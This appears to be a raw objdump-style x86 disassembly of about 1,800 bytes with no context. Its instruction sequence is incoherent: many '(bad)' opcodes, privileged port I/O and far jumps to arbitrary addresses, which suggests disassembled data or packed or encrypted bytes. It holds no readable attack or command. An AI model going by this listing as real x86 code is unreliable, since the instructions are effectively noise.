  479e0b:	mov    ds:0xc51e54c1,al
  479e10:	scas   eax,DWORD PTR es:[edi]
  479e11:	push   edx
  479e12:	cmp    al,0x86
  479e14:	mov    dh,0xbd
  479e16:	fdivr  DWORD PTR [eax]
  479e18:	sti    
  479e19:	jp     0x479e8c
  479e1b:	jns    0x479e10
  479e1d:	ror    DWORD PTR [edi],1
  479e1f:	ja     0x479e50
  479e21:	and    al,0x5f
  479e23:	jmp    FWORD PTR [edi-0x4]
  479e26:	mov    edi,0x2e7387ce
  479e2b:	or     BYTE PTR [esp+edi*8+0x69814f55],cl
  479e32:	adc    ecx,DWORD PTR [edi-0x1b117cbc]
  479e38:	push   ss
  479e39:	add    ah,BYTE PTR [ecx]
  479e3b:	scas   eax,DWORD PTR es:[edi]
  479e3c:	cld    
  479e3d:	add    al,0x2a
  479e3f:	pop    ss
  479e40:	(bad)  
  479e41:	(bad)  
  479e43:	sar    DWORD PTR [edi],1
  479e45:	lahf   
  479e46:	call   esi
  479e48:	jecxz  0x479dfb
  479e4a:	pop    es
  479e4b:	add    cl,BYTE PTR [ebp-0x54]
  479e4e:	xchg   ebx,eax
  479e4f:	xor    BYTE PTR [esi],al
  479e51:	in     eax,dx
  479e52:	pop    ds
  479e53:	or     DWORD PTR [ecx],ebx
  479e55:	jecxz  0x479e04
  479e57:	(bad)  
  479e58:	dec    DWORD PTR [ebx-0x61]
  479e5b:	out    dx,al
  479e5c:	les    edx,FWORD PTR ds:0xe6ad2218
  479e62:	dec    ebx
  479e63:	dec    edi
  479e64:	icebp  
  479e65:	or     bh,BYTE PTR [ebp+0x5d]
  479e68:	je     0x479ec8
  479e6a:	pop    ecx
  479e6b:	fcom   DWORD PTR [ebx+0x74]
  479e6e:	mov    edi,0xbfffc35d
  479e73:	xor    ecx,DWORD PTR [esi]
  479e75:	test   DWORD PTR [eax],0x59540320
  479e7b:	mov    ds:0x29368ec0,eax
  479e80:	sbb    edx,ebx
  479e82:	cld    
  479e83:	iret   
  479e84:	addr16 cvtdq2ps xmm2,xmm0
  479e88:	pop    edx
  479e89:	push   0xfffffffd
  479e8b:	sub    ebx,0xffffffb0
  479e8e:	pop    esi
  479e8f:	inc    eax
  479e90:	ins    DWORD PTR es:[edi],dx
  479e91:	(bad)  
  479e93:	(bad)  
  479e94:	outs   dx,DWORD PTR ds:[esi]
  479e95:	mov    eax,ds:0x31a0dfe8
  479e9a:	das    
  479e9b:	(bad)  
  479e9c:	fidiv  WORD PTR [ebx+0x2b]
  479e9f:	sbb    eax,0x1711b090
  479ea4:	or     ch,BYTE PTR [ebp+0x71]
  479ea7:	cmp    eax,0x1f254f44
  479eac:	das    
  479ead:	ds inc eax
  479eaf:	mov    esp,0x7f0bf84d
  479eb4:	add    eax,0x1624c22a
  479eb9:	sub    edi,ecx
  479ebb:	lahf   
  479ebc:	ret    0x7dd1
  479ebf:	cs pushf 
  479ec1:	mov    edx,0xfb5fcf1e
  479ec6:	lahf   
  479ec7:	lahf   
  479ec8:	mov    ch,0x3
  479eca:	adc    bl,BYTE PTR [edi+0x28]
  479ecd:	cwde   
  479ece:	fistp  QWORD PTR [edi+0x6f]
  479ed1:	mov    ds:0xaf3b87c3,al
  479ed6:	and    DWORD PTR [ebx+0x42],ebx
  479ed9:	cmp    DWORD PTR [edi],0x5ade2fff
  479edf:	loop   0x479e8e
  479ee1:	neg    BYTE PTR [edi+0x24]
  479ee4:	push   ds
  479ee5:	xchg   BYTE PTR [edi+0x62],bh
  479ee8:	fisttp WORD PTR [esi+0x66]
  479eeb:	xor    dl,dh
  479eed:	push   DWORD PTR [edi+0x6fc59f05]
  479ef3:	sub    BYTE PTR [ebx+edx*4],cl
  479ef6:	mov    ecx,0x43ae7b41
  479efb:	sub    eax,0xf658125c
  479f00:	icebp  
  479f01:	mov    ch,0xc1
  479f03:	push   edx
  479f04:	sub    DWORD PTR [edi+0x399f57af],0xbffffcbf
  479f0e:	jg     0x479f30
  479f10:	sub    cl,BYTE PTR [ebp+0x6a20c182]
  479f16:	xor    al,ah
  479f18:	scas   al,BYTE PTR es:[edi]
  479f19:	adc    bh,BYTE PTR [edi]
  479f1b:	int3   
  479f1c:	cmp    ebx,DWORD PTR [ecx+0x56]
  479f1f:	push   esp
  479f20:	and    al,0xb4
  479f22:	push   ebx
  479f23:	add    al,0x22
  479f25:	mov    edi,0xd2fb7c8c
  479f2a:	jmp    DWORD PTR [eax]
  479f2c:	or     esi,eax
  479f2e:	push   ss
  479f2f:	sub    eax,0xb9651355
  479f34:	lds    ebp,FWORD PTR [edi+0x16]
  479f37:	mov    BYTE PTR cs:[esi+0x7815c6f3],ch
  479f3e:	jp     0x479eff
  479f40:	les    ecx,FWORD PTR ds:0xe6f6cf6e
  479f46:	dec    edi
  479f47:	sub    esi,DWORD PTR [ecx]
  479f49:	pop    edi
  479f4a:	adc    DWORD PTR [esi],ebp
  479f4c:	(bad)  
  479f4d:	and    eax,0x4b8efe59
  479f52:	in     eax,dx
  479f53:	push   ebp
  479f54:	push   esp
  479f55:	inc    esi
  479f56:	pop    ds
  479f57:	xchg   DWORD PTR [edx+0x29],ebp
  479f5a:	lahf   
  479f5b:	dec    edi
  479f5c:	hlt    
  479f5d:	sub    al,0x4f
  479f5f:	sub    DWORD PTR [eax],edx
  479f61:	imul   edi,eax,0x2d
  479f64:	(bad)  
  479f65:	fistp  WORD PTR [edi+0x694b52e4]
  479f6b:	loope  0x479f4a
  479f6d:	and    al,0x20
  479f6f:	lds    edi,FWORD PTR ds:0x8a6f8f5a
  479f75:	in     al,0x85
  479f77:	and    DWORD PTR [eax-0x77],ebp
  479f7a:	(bad)  
  479f7b:	fistp  WORD PTR [ebx]
  479f7d:	mov    WORD PTR [ecx+0x3acd2610],gs
  479f83:	jno    0x479fd4
  479f85:	add    BYTE PTR [edx-0x76],bl
  479f88:	jmp    0x2e05:0xff1edf8b
  479f8f:	push   eax
  479f90:	fbld   TBYTE PTR [ebx]
  479f92:	xlat   BYTE PTR ds:[ebx]
  479f93:	ds (bad) 
  479f95:	xor    DWORD PTR [esi-0x70],edx
  479f98:	ret    
  479f99:	xchg   esi,eax
  479f9a:	bound  esi,QWORD PTR [edx+0x31]
  479f9d:	test   al,0xf4
  479f9f:	aaa    
  479fa0:	lock mov al,0xb0
  479fa3:	add    ch,BYTE PTR [eax]
  479fa5:	aas    
  479fa6:	push   ebp
  479fa7:	adc    bl,BYTE PTR [esi-0x7a]
  479faa:	(bad)  
  479fab:	lods   al,BYTE PTR ds:[esi]
  479fac:	cmp    al,0x4f
  479fae:	punpcklbw mm0,DWORD PTR [edi]
  479fb1:	(bad)  
  479fb2:	das    
  479fb3:	aas    
  479fb4:	js     0x479fd5
  479fb6:	aas    
  479fb7:	and    al,dl
  479fb9:	lods   eax,DWORD PTR ds:[esi]
  479fba:	sbb    edi,DWORD PTR [ecx]
  479fbc:	clc    
  479fbd:	cmp    eax,0x6f396863
  479fc2:	fistp  WORD PTR [edi+0x1a]
  479fc5:	(bad)  
  479fc6:	jg     0x479fd7
  479fc8:	push   ss
  479fc9:	mov    esi,0x3af64fe3
  479fce:	dec    edi
  479fcf:	dec    ebx
  479fd0:	xchg   dl,dh
  479fd2:	mov    al,ds:0xffe05b12
  479fd7:	cmp    BYTE PTR [esi],dl
  479fd9:	mov    eax,0x5f4413c1
  479fde:	imul   ecx,DWORD PTR [edx+0x5bbf301f],0xffffffd3
  479fe5:	call   FWORD PTR [ebx+0x1f]
  479fe8:	cmp    eax,0x7a5f2cd5
  479fed:	jp     0x47a061
  479fef:	mov    ebx,0x3f15e4ce
  479ff4:	xchg   BYTE PTR [edi],bl
  479ff6:	iret   
  479ff7:	test   DWORD PTR [edi-0x58],ebx
  479ffa:	shr    DWORD PTR [eax],0x71
  479ffd:	outs   dx,DWORD PTR ds:[esi]
  479ffe:	lahf   
  479fff:	iret   
  47a000:	test   DWORD PTR ds:0x7e0f0a2b,edi
  47a006:	and    DWORD PTR ds:0xce3759fe,0x7352d25
  47a010:	out    dx,eax
  47a011:	aam    0xff
  47a013:	je     0x47a082
  47a015:	fdivr  st(3),st
  47a017:	and    al,0x1b
  47a019:	cli    
  47a01a:	out    dx,eax
  47a01b:	adc    edi,edi
  47a01d:	push   0xa
  47a01f:	jmp    0x758:0xe0e053af
  47a026:	jg     0x47a05f
  47a028:	push   esp
  47a029:	add    DWORD PTR [edx],0xffffffff
  47a02c:	in     al,dx
  47a02d:	ss adc ecx,0x1f
  47a031:	and    bh,BYTE PTR [esi+eax*8]
  47a034:	cmp    edx,DWORD PTR [ebx]
  47a036:	or     ecx,esp
  47a038:	outs   dx,DWORD PTR ds:[esi]
  47a039:	xor    eax,0x977f16fe
  47a03e:	ins    DWORD PTR es:[edi],dx
  47a03f:	dec    edx
  47a040:	push   ecx
  47a041:	iret   
  47a042:	mov    WORD PTR [edi+0x5a2d77d0],?
  47a048:	cmp    ebp,DWORD PTR [edi+ebx*8-0x21]
  47a04c:	(bad)  
  47a04e:	mov    edi,0xad312faf
  47a053:	mov    bl,0xd
  47a055:	es iret 
  47a057:	and    eax,0xac9f554c
  47a05c:	scas   eax,DWORD PTR es:[edi]
  47a05d:	aas    
  47a05e:	sub    ecx,DWORD PTR [ebp-0x5a]
  47a061:	sub    BYTE PTR [eax+esi*8],ah
  47a064:	test   DWORD PTR [ebp+0x5526c5df],esi
  47a06a:	or     DWORD PTR [edi-0x27a97a30],ebp
  47a070:	pop    ds
  47a071:	jns    0x47a0a2
  47a073:	pop    ds
  47a074:	aas    
  47a075:	mov    DWORD PTR [esi-0x2f900fd1],ebp
  47a07b:	iret   
  47a07c:	es jg  0x47a0d3
  47a07f:	push   esi
  47a080:	fwait
  47a081:	int    0x9e
  47a083:	cmp    ah,BYTE PTR [esi]
  47a085:	pop    DWORD PTR [eax+0x38362631]
  47a08b:	std    
  47a08c:	dec    ebx
  47a08d:	scas   eax,DWORD PTR es:[edi]
  47a08e:	dec    ebx
  47a08f:	data16 sub al,0x56
  47a092:	xchg   al,dl
  47a094:	mov    ebp,edi
  47a096:	outs   dx,DWORD PTR ds:[esi]
  47a097:	dec    edi
  47a098:	mov    esp,0xbf3635b0
  47a09d:	jno    0x47a06e
  47a09f:	pop    ds
  47a0a0:	ret    
  47a0a1:	outs   dx,DWORD PTR ds:[esi]
  47a0a2:	dec    edx
  47a0a3:	dec    eax
  47a0a4:	xchg   ebx,eax
  47a0a5:	sub    eax,0xdf6fd2fe
  47a0aa:	adc    edx,eax
  47a0ac:	and    BYTE PTR [edx+0x67],cl
  47a0af:	scas   eax,DWORD PTR es:[edi]
  47a0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a0b1:	mov    WORD PTR [edi+0x5f042622],ss
  47a0b7:	pop    ss
  47a0b8:	cli    
  47a0b9:	call   DWORD PTR [edx+0x3f]
  47a0bc:	out    0x5,al
  47a0be:	push   0xbe2a004a
  47a0c3:	int    0x97
  47a0c5:	daa    
  47a0c6:	and    al,0xc
  47a0c8:	jg     0x47a125
  47a0ca:	outs   dx,DWORD PTR ds:[esi]
  47a0cb:	inc    eax
  47a0cc:	mov    eax,ds:0x4e6f1b43
  47a0d1:	dec    edi
  47a0d2:	(bad)  
  47a0d3:	fidivr DWORD PTR [eax+0x804ba50]
  47a0d9:	xchg   edx,eax
  47a0da:	outs   dx,DWORD PTR ds:[esi]
  47a0db:	mov    edi,0x691f0d65
  47a0e0:	stc    
  47a0e1:	mov    edi,0x2f3f1fc4
  47a0e6:	or     DWORD PTR [eax+0x26d44fbd],esi
  47a0ec:	pop    edi
  47a0ed:	ins    DWORD PTR es:[edi],dx
  47a0ee:	je     0x47a13c
  47a0f0:	test   ch,ch
  47a0f2:	test   eax,0xedffe373
  47a0f7:	jg     0x47a093
  47a0f9:	sbb    DWORD PTR [ebx],0x20
  47a0fc:	les    esp,FWORD PTR [eax]
  47a0fe:	inc    ebx
  47a0ff:	jp     0x47a155
  47a101:	dec    edi
  47a102:	rcl    edi,1
  47a104:	jge    0x47a134
  47a106:	add    DWORD PTR [esp+ebx*8+0x20cf3e04],ecx
  47a10d:	dec    edi
  47a10e:	outs   dx,DWORD PTR ds:[esi]
  47a10f:	mov    ch,0x76
  47a111:	jg     0x47a17a
  47a113:	and    al,0xb2
  47a115:	into   
  47a116:	mov    BYTE PTR [ebx+0x1f],dl
  47a119:	scas   eax,DWORD PTR es:[edi]
  47a11a:	push   es
  47a11b:	dec    edi
  47a11c:	pop    edi
  47a11d:	cmp    bh,BYTE PTR [edx+0x6e]
  47a120:	push   ss
  47a121:	outs   dx,DWORD PTR ds:[esi]
  47a122:	std    
  47a123:	test   DWORD PTR [edx+0x3e191d3f],edi
  47a129:	mov    edi,0x499f1995
  47a12e:	jge    0x47a172
  47a130:	mov    al,0x8d
  47a132:	es aad 0xe8
  47a135:	mov    ebp,esp
  47a137:	scas   eax,DWORD PTR es:[edi]
  47a138:	pop    ds
  47a139:	pop    ds
  47a13a:	inc    ecx
  47a13b:	mov    ebx,0x6c66c1b4
  47a140:	cmp    DWORD PTR [edx-0x44e5ac06],0xba51d8d4
  47a14a:	int3   
  47a14b:	push   cs
  47a14c:	(bad)  
  47a14d:	dec    DWORD PTR [edi+0x22fc1bf]
  47a153:	(bad)  
  47a154:	(bad)  
  47a155:	mov    edi,0x4697b09f
  47a15a:	jle    0x47a14c
  47a15c:	or     eax,0x6f10567f
  47a161:	mov    ch,0xd0
  47a163:	popf   
  47a164:	and    edi,DWORD PTR [esi]
  47a166:	ins    DWORD PTR es:[edi],dx
  47a167:	scas   al,BYTE PTR es:[edi]
  47a168:	(bad)  
  47a169:	and    al,0x10
  47a16b:	lock fild QWORD PTR [eax+0x7dfd6fd1]
  47a172:	xor    BYTE PTR [ebp-0x5f],ah
  47a175:	int3   
  47a176:	pop    DWORD PTR [ecx]
  47a178:	pop    esp
  47a179:	rol    DWORD PTR [ebx+0x7c639f31],1
  47a17f:	mov    eax,ds:0xbf4ebc56
  47a184:	in     al,dx
  47a185:	mov    bh,0x0
  47a187:	or     BYTE PTR [edi+0x7f6b0efc],ch
  47a18d:	inc    ebx
  47a18e:	pop    edi
  47a18f:	cmp    ebp,DWORD PTR [esi-0x4d]
  47a192:	loopne 0x47a125
  47a194:	xor    eax,0x558fbf2c
  47a199:	pop    edx
  47a19a:	psadbw mm4,QWORD PTR [esi]
  47a19d:	lahf   
  47a19e:	cmp    eax,0x8fe05b7b
  47a1a3:	or     ebp,DWORD PTR [edi-0x52]
  47a1a6:	scas   eax,DWORD PTR es:[edi]
  47a1a7:	stos   BYTE PTR es:[edi],al
  47a1a8:	rcl    dl,1
  47a1aa:	test   DWORD PTR [edi],ecx
  47a1ac:	sbb    al,0x8c
  47a1ae:	pop    ds
  47a1af:	sub    dl,bh
  47a1b1:	mov    al,ah
  47a1b3:	inc    edx
  47a1b4:	inc    edi
  47a1b5:	cpuid  
  47a1b7:	mov    bh,0x3e
  47a1b9:	cmp    DWORD PTR [edi-0x40],edi
  47a1bc:	lods   eax,DWORD PTR ds:[esi]
  47a1bd:	pop    ebx
  47a1be:	mov    bh,0x6f
  47a1c0:	jae    0x47a1ff
  47a1c2:	movnti DWORD PTR [eax+0x2c89172f],edi
  47a1c9:	ins    BYTE PTR es:[edi],dx
  47a1ca:	test   DWORD PTR [esi+0x1d832e7f],edi
  47a1d0:	inc    ebp
  47a1d1:	lahf   
  47a1d2:	dec    edi
  47a1d3:	rol    BYTE PTR [edi+0x38],1
  47a1d6:	lea    edx,[esi-0x7fe0b408]
  47a1dc:	and    esp,DWORD PTR [edi]
  47a1de:	(bad)  
  47a1df:	daa    
  47a1e0:	dec    ecx
  47a1e1:	pop    edi
  47a1e2:	push   0xd8e0b08f
  47a1e7:	call   0x6f61b16c
  47a1ec:	mov    edx,0xad095f2f
  47a1f1:	or     bh,bh
  47a1f3:	das    
  47a1f4:	mov    edx,0x15abf1d6
  47a1f9:	push   ds
  47a1fa:	cmp    ah,BYTE PTR [ecx-0x1aeccd72]
  47a200:	mov    edi,0x74b46b9f
  47a205:	mov    ecx,DWORD PTR [ecx+ebp*2-0x1c]
  47a209:	sbb    cl,BYTE PTR [edi-0x6c]
  47a20c:	fistp  WORD PTR [edi]
  47a20e:	fwait
  47a20f:	cmp    dh,ah
  47a211:	bound  edi,QWORD PTR [ebx]
  47a213:	jmp    FWORD PTR [edi]
  47a215:	jmp    FWORD PTR [edi+0x1a3bff03]
  47a21b:	test   DWORD PTR [esi],ebp
  47a21d:	fistp  WORD PTR [edi]
  47a21f:	out    dx,eax
  47a220:	retf   0x32b4
  47a223:	ds add eax,0x2602ade0
  47a229:	shl    BYTE PTR [ebp+0x22c0cdb6],0x3
  47a230:	(bad)  
  47a232:	(bad)  
  47a233:	out    dx,eax
  47a234:	push   ds
  47a235:	pop    edi
  47a236:	ss push ss
  47a238:	push   0xa33b16fe
  47a23d:	add    BYTE PTR [ebp+0x9],bh
  47a240:	and    esp,esp
  47a242:	das    
  47a243:	push   ds
  47a244:	scas   eax,DWORD PTR es:[edi]
  47a245:	adc    al,0x2f
  47a247:	hlt    
  47a248:	jg     0x47a225
  47a24a:	fild   QWORD PTR [eax]
  47a24c:	mov    edi,0xe3af0a30
  47a251:	xlat   BYTE PTR ds:[ebx]
  47a252:	xor    BYTE PTR gs:[esp+edx*8],ch
  47a256:	in     al,0x8f
  47a258:	retf   
  47a259:	das    
  47a25a:	pop    edi
  47a25b:	mov    DWORD PTR [esi],edx
  47a25d:	(bad)  
  47a25e:	(bad)  
  47a25f:	jg     0x47a294
  47a261:	bound  edx,QWORD PTR [ecx+0x7d6683f0]
  47a267:	add    eax,0xb1b89d5
  47a26c:	aad    0x7a
  47a26e:	sub    eax,0xad4df6f
  47a273:	outs   dx,DWORD PTR ds:[esi]
  47a274:	mov    ch,0x93
  47a276:	xor    bh,BYTE PTR [edi]
  47a278:	mov    esp,0x5f8f189b
  47a27d:	lods   eax,DWORD PTR ds:[esi]
  47a27e:	xchg   esi,eax
  47a27f:	inc    BYTE PTR [ebx-0x7ec69581]
  47a285:	mov    al,0x1c
  47a287:	adc    esp,edx
  47a289:	sub    cl,bh
  47a28b:	and    DWORD PTR [edi],edi
  47a28d:	cmc    
  47a28e:	(bad)  
  47a28f:	push   DWORD PTR [edi+0x6d3d4fd1]
  47a295:	inc    ebx
  47a296:	ret    0x2684
  47a299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a29a:	sub    esi,esp
  47a29c:	push   ss
  47a29d:	dec    edx
  47a29e:	jecxz  0x47a283
  47a2a0:	fild   QWORD PTR [ebx-0x2dac87f]
  47a2a6:	jnp    0x47a322
  47a2a8:	cmc    
  47a2a9:	adc    BYTE PTR [eax+0x4f3f003a],al
  47a2af:	pop    edi
  47a2b0:	sub    dh,ah
  47a2b2:	mov    edi,0xa2a20a07
  47a2b7:	mov    edx,DWORD PTR [ebx+0x38]
  47a2ba:	ins    DWORD PTR es:[edi],dx
  47a2bb:	jg     0x47a2dc
  47a2bd:	repz dec ecx
  47a2bf:	dec    esp
  47a2c0:	or     esi,esp
  47a2c2:	jle    0x47a245
  47a2c4:	push   esi
  47a2c5:	pop    edi
  47a2c6:	setae  BYTE PTR [ebx+0x25]
  47a2ca:	ins    DWORD PTR es:[edi],dx
  47a2cb:	xchg   edx,eax
  47a2cc:	nop    eax
  47a2cf:	pop    ebp
  47a2d0:	jge    0x47a253
  47a2d2:	fiadd  WORD PTR [esi+ecx*2]
  47a2d5:	xchg   edi,eax
  47a2d6:	neg    bh
  47a2d8:	cs mov cl,0x80
  47a2db:	ja     0x47a327
  47a2dd:	jl     0x47a2dd
  47a2df:	jg     0x47a310
  47a2e1:	push   ebp
  47a2e2:	sbb    edi,DWORD PTR [ebp-0x48]
  47a2e5:	(bad)  
  47a2e6:	xchg   esi,eax
  47a2e7:	jge    0x47a324
  47a2e9:	or     DWORD PTR [edx-0x45b98e24],eax
  47a2ef:	inc    edx
  47a2f0:	stos   DWORD PTR es:[edi],eax
  47a2f1:	rcr    edi,0xbf
  47a2f4:	retf   0x2e3e
  47a2f7:	pavgb  mm5,QWORD PTR [edi+edi*1-0x2b4b70e1]
  47a2ff:	push   0x3f03ff84
  47a304:	outs   dx,DWORD PTR ds:[esi]
  47a305:	adc    al,BYTE PTR ds:0xdf243d28
  47a30b:	push   ds
  47a30c:	and    edi,edx
  47a30e:	pop    edi
  47a30f:	outs   dx,DWORD PTR ds:[esi]
  47a310:	cmc    
  47a311:	outs   dx,DWORD PTR ds:[esi]
  47a312:	xchg   esp,eax
  47a313:	clc    
  47a314:	test   bh,0x9c
  47a317:	and    esp,DWORD PTR [esi]
  47a319:	out    dx,eax
  47a31a:	cmovg  esi,eax
  47a31d:	es dec ebx
  47a31f:	jge    0x47a344
  47a321:	imul   ecx,DWORD PTR [ebp+0x5b],0x5c
  47a325:	push   0xe237f0f
  47a32a:	out    dx,eax
  47a32b:	add    al,0xcf
  47a32d:	jno    0x47a2dd
  47a32f:	rol    DWORD PTR [ebx-0x5ab2f100],0xa4
  47a336:	lahf   
  47a337:	dec    edi
  47a338:	dec    BYTE PTR [ebp+0x3fff16b7]
  47a33e:	(bad)  
  47a33f:	cmp    DWORD PTR [edi],0x5b3a6bf
  47a345:	and    dl,al
  47a347:	adc    eax,0x2fffff7e
  47a34c:	aam    0x79
  47a34e:	mov    edi,0x4a6181c5
  47a353:	sub    eax,0xab4bebaa
  47a358:	sbb    DWORD PTR [esi+0xa29b63c],eax
  47a35e:	jl     0x47a302
  47a360:	lea    edx,ds:0xffffc0bf
  47a366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a367:	jl     0x47a3a5
  47a369:	jl     0x47a343
  47a36b:	pop    esp
  47a36c:	pusha  
  47a36d:	cdq    
  47a36e:	cmp    al,0x8a
  47a370:	dec    esi
  47a371:	or     dl,BYTE PTR [esi]
  47a373:	in     eax,dx
  47a374:	xor    ebp,edi
  47a376:	jb     0x47a3ca
  47a378:	fild   WORD PTR [edi+0x7d]
  47a37b:	sti    
  47a37c:	dec    ecx
  47a37d:	jp     0x47a3ed
  47a37f:	icebp  
  47a380:	inc    edx
  47a381:	test   DWORD PTR [eax-0x31],esp
  47a384:	call   DWORD PTR [edi-0x1980dce1]
  47a38a:	sbb    DWORD PTR [ecx],ecx
  47a38c:	push   edi
  47a38d:	shr    DWORD PTR [esi],cl
  47a38f:	mov    edi,0xcb3f2310
  47a394:	jmp    FWORD PTR [edi]
  47a396:	push   0x5c
  47a398:	and    BYTE PTR [eax-0x31],bl
  47a39b:	out    dx,eax
  47a39c:	clc    
  47a39d:	(bad)  
  47a39e:	jg     0x47a383
  47a3a0:	test   DWORD PTR [edi+0x51],ebp
  47a3a3:	das    
  47a3a4:	push   DWORD PTR [esi]
  47a3a6:	add    bh,ah
  47a3a8:	or     ecx,edi
  47a3aa:	xor    DWORD PTR [edx-0x5c],ebx
  47a3ad:	lahf   
  47a3ae:	adc    eax,0x3c7f8178
  47a3b3:	push   es
  47a3b4:	add    al,BYTE PTR [edi+0x6f0119b5]
  47a3ba:	popa   
  47a3bb:	xor    bx,WORD PTR [edi]
  47a3be:	das    
  47a3bf:	mov    ch,0xf4
  47a3c1:	pusha  
  47a3c2:	aas    
  47a3c3:	ss pop ds
  47a3c5:	repz push ds
  47a3c7:	pop    ebp
  47a3c8:	setnp  al
  47a3cb:	test   DWORD PTR [ebp+0xff8da6e],esp
  47a3d1:	pop    ds
  47a3d2:	sbb    eax,0xff4fbd84
  47a3d7:	(bad)  
  47a3d8:	jp     0x47a458
  47a3da:	scas   al,BYTE PTR es:[edi]
  47a3db:	(bad)  
  47a3dd:	mov    eax,0x2500fad5
  47a3e2:	or     edx,DWORD PTR [ebx+ebp*4+0x6860ffc3]
  47a3e9:	dec    edi
  47a3ea:	clc    
  47a3eb:	lock xchg ecx,eax
  47a3ed:	pxor   mm3,QWORD PTR [eax-0x18]
  47a3f1:	lods   eax,DWORD PTR ds:[esi]
  47a3f2:	or     ebp,DWORD PTR [edi]
  47a3f4:	mov    dl,0x3
  47a3f6:	adc    ecx,DWORD PTR [edi]
  47a3f8:	dec    edx
  47a3f9:	fisttp WORD PTR [ecx+0x76348bce]
  47a3ff:	lock inc DWORD PTR [edx-0x71]
  47a403:	xchg   ebx,eax
  47a404:	out    dx,eax
  47a405:	ja     0x47a473
  47a407:	sub    BYTE PTR [edx+0xe],0x79
  47a40b:	xor    eax,0x2edfa579
  47a410:	ins    DWORD PTR es:[edi],dx
  47a411:	dec    DWORD PTR [ebp-0x2ca061a2]
  47a417:	jge    0x47a493
  47a419:	inc    esp
  47a41a:	jg     0x47a3d4
  47a41c:	jns    0x47a468
  47a41e:	(bad)  
  47a41f:	loopne 0x47a435
  47a421:	ja     0x47a46a
  47a423:	ja     0x47a424
  47a425:	(bad)  
  47a426:	jmp    DWORD PTR [edx+0x54c92c59]
  47a42c:	push   ds
  47a42d:	xlat   BYTE PTR ds:[ebx]
  47a42e:	jp     0x47a414
  47a430:	(bad)
  47a434:	cmp    BYTE PTR [edi+0x57],dh
  47a437:	mov    ds:0x550d2c5d,al
  47a43c:	mov    esi,0xbd0f72d6
  47a441:	loopne 0x47a47f
  47a443:	in     eax,dx
  47a444:	(bad)  
  47a445:	(bad)  
  47a446:	push   DWORD PTR [edi-0x5]
  47a449:	mov    ds:0x54d12da9,eax
  47a44e:	(bad)  
  47a44f:	(bad)  
  47a450:	push   0xffffffe4
  47a452:	out    0x4a,eax
  47a454:	jge    0x47a437
  47a456:	or     BYTE PTR [edi+0x5b],dh
  47a459:	mov    ds:0x551d2c51,al
  47a45e:	(bad)  
  47a460:	stos   BYTE PTR es:[edi],al
  47a461:	in     eax,0x2f
  47a463:	imul   edx,eax,0xffffffb0
  47a466:	cdq    
  47a467:	mov    cl,0x3f
  47a469:	mov    edi,ebx
  47a46b:	inc    ebp
  47a46c:	aas    
  47a46d:	fisttp WORD PTR [ebx]
  47a46f:	sub    al,0xc0
  47a471:	push   edx
  47a472:	retf   
  47a473:	nop
  47a474:	pop    edi
  47a475:	(bad)  
  47a476:	aas    
  47a477:	addr16 loopne 0x47a406
  47a47a:	in     eax,0x16
  47a47c:	out    dx,eax
  47a47d:	mov    dl,0xc3
  47a47f:	cmp    bh,BYTE PTR [edi-0x53921eeb]
  47a485:	push   eax
  47a486:	das    
  47a487:	pxor   mm7,QWORD PTR [esi]
  47a48a:	lsl    edi,WORD PTR [eax]
  47a48d:	ret    0x6baf
  47a490:	push   ebp
  47a491:	(bad)  
  47a492:	jg     0x47a4e9
  47a494:	sbb    edi,DWORD PTR [edx-0x4d]
  47a497:	rol    BYTE PTR [ebp-0x79fde68d],1
  47a49d:	test   al,0x0
  47a49f:	cs jg  0x47a441
  47a4a2:	js     0x47a51a
  47a4a4:	sbb    BYTE PTR [eax-0x5e],dh
  47a4a7:	sbb    BYTE PTR [edi+0x3dad0f7a],0x2
  47a4ae:	sbb    ebp,DWORD PTR [edi+0x14]
  47a4b1:	dec    edi
  47a4b2:	pop    edi
  47a4b3:	sbb    ebp,DWORD PTR [edi-0xd]
  47a4b6:	lahf   
  47a4b7:	popa   
  47a4b8:	aas    
  47a4b9:	mov    DWORD PTR [edi+0x7f24fc1],edi
  47a4bf:	cmp    dl,cl
  47a4c1:	cmp    DWORD PTR [edi+0x8],ebx
  47a4c4:	imul   esi,DWORD PTR [ebp-0x30d9743f],0xffffffb5
  47a4cb:	clc    
  47a4cc:	dec    ebx
  47a4cd:	jge    0x47a462
  47a4cf:	repnz mov cr1,edi
  47a4d3:	adc    DWORD PTR [eax+0x37],ebp
  47a4d6:	imul   edi,DWORD PTR [ecx-0x7c80f029],0x2fff7ab7
  47a4e0:	shl    BYTE PTR [esi],0x58
  47a4e3:	loope  0x47a519
  47a4e5:	(bad)  
  47a4e6:	sahf   
  47a4e7:	xchg   esp,eax
  47a4e8:	and    DWORD PTR ds:0x1bed6a36,esp
  47a4ee:	movsx  ebx,WORD PTR [eax]
  47a4f1:	and    ebx,DWORD PTR [ebp-0x2990d6e1]
  47a4f7:	or     eax,0x6f2dfadc
  47a4fc:	and    eax,0x4bdcde01
  47a501:	(bad)  
  47a503:	dec    eax
  47a504:	das    
  47a505:	stc    
  47a506:	sbb    ebp,DWORD PTR [ebp-0x40]
  47a509:	add    DWORD PTR [edi-0x10d1f8c1],edi
  47a50f:	pop    edx
  47a510:	sub    DWORD PTR ds:0x2666ff96,0xd8a2e86e
  47a51a:	jl     0x47a556
  47a51c:	or     al,0x0
  47a51e:	aas    
  47a51f:	sub    eax,0xfff1df3f
  47a524:	inc    esp
  47a525:	(bad)  
  47a526:	mov    eax,0x91433976
  47a52b:	mov    ch,0x7
  47a52d:	dec    edi
  47a52e:	mov    eax,ds:0x8a0a57af
  47a533:	rep lods eax,DWORD PTR ds:[esi]
  47a535:	mov    edx,eax
  47a537:	int    0xd4
  47a539:	add    edx,DWORD PTR [esi]
  47a53b:	pop    ds
  47a53c:	dec    ebx
  47a53d:	iret   
  47a53e:	sub    al,0xbf
  47a540:	dec    edi
  47a541:	lock rcr BYTE PTR [ebx+0x7c],cl
  47a545:	mov    ecx,0x6f2490c4
  47a54a:	test   DWORD PTR [eax+0x423b5f3a],eax
  47a550:	jp     0x47a55d
  47a552:	lods   eax,DWORD PTR ds:[esi]
  47a553:	pop    ecx
  47a554:	xor    al,0x5f
  47a556:	(bad)  
  47a557:	das    
  47a558:	push   DWORD PTR [ebx]
  47a55a:	pop    edi
  47a55b:	jg     0x47a4de
  47a55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a55e:	push   es
  47a55f:	aas    
  47a560:	pmuludq mm1,QWORD PTR [edi-0x4d70fbc7]
